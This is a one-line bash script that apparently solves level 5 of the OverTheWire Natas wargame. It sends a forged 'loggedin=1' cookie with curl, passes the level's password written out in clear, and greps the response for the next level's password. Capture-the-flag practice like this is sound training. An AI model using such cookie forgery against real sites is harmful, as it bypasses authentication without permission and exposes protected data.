#!/usr/bin/bash

curl -s --cookie "loggedin=1" -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ | grep -oP '(?<=(natas6 is )).*(?=</)'

